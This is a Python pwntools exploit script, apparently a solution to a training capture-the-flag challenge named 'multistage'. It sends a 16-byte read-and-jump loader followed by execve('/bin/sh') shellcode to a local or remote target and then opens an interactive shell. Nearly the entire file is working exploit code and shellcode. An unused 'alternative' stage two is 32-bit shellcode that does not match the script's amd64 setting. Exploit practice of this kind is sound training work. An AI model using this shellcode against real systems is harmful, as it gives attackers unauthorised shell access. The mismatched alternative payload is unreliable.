from pwn import *

from pwn import *

COMMANDS = """
xuntil 0x40123f
"""

# First stage: 16-byte loader that reads more shellcode from stdin
# sys_read(0, current_address, large_size)
stage1 = asm('''
    xor rax, rax      ; syscall 0 = read
    xor rdi, rdi      ; fd = 0 (stdin)
    mov rsi, rsp      ; buf = current stack position
    mov dx, 0x1000    ; count = 4096 bytes
    syscall
    jmp rsi           ; jump to the new shellcode
''')

# Second stage: actual execve("/bin/sh", 0, 0) shellcode
stage2 = asm('''
    mov rax, 59
    lea rdi, [rip+binsh]
    xor rsi, rsi
    xor rdx, rdx
    syscall
binsh:
    .string "/bin/sh"
''')

# Alternative shorter stage2 (23 bytes)
stage2_alt = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

context.arch = 'amd64'

if args.GDB:
    p = gdb.debug("./multistage", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./multistage")

# Send first stage loader
p.send(stage1.ljust(16, b'\x90'))  # Pad to 16 bytes with NOPs

# Send second stage execve shellcode
p.send(stage2)

p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f

